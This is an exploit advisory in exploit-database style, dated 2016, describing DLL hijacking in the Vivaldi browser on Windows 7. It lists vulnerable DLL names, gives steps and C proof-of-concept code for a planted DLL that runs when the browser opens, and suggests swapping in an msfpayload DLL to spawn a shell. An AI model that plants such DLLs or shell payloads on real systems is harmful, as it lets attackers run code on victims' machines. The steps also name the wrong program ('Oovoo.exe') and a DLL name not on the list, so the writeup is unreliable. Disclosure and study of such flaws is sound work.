# Exploit Title: Vivaldi browser DLL Hijacking
# Author: Ashiyane Digital Security Team
# Vendor Homepage: https://vivaldi.com/
# software link:
 https://downloads.vivaldi.com/stable/Vivaldi.1.4.589.11.exe
# Tested on:Windows 7
# Date: 13-09-2016
----------------------------------------------------------------------------------------------------------
vulnerable DLLs :
api-ms-win-core-localization-l1-2-1.dll
api-ms-win-core-fibers-l1-1-1.dll
api-ms-win-core-synch-l1-2-0.dll
api-ms-win-core-datetime-l1-1-1.dll
api-ms-win-core-localization-obsolete-l1-2-0.dll
If an attacker can place the malicious dll with any names of above
series in same location with vivaldi.exe where
victim open vivaldi.exe it will load and run the attackers DLL
and code.
also can generate a msfpayload DLL and spawn a shell, for example.

----------------------------------------------------------------------------------------------------------
# Exploit:
1- Save and compile below C code to create vuln DLL

2- Place vuln DLL on Same Directory of Oovoo.exe

3- Open vivaldi.exe

//gcc test.c -o shcore.dll -shared
//this dll show a message box
#include <windows.h>
#define DllExport __declspec (dllexport)

BOOL WINAPI DllMain (
HANDLE hinstDLL,
DWORD fdwReason,
LPVOID lpvReserved)
{
dll_hijack();
return 0;
}

int dll_hijack()
{
MessageBox(0, "DLL Hijacking!", "DLL Message", MB_OK);
return 0;
}
#################
Discovered By : Amir.ght
#################
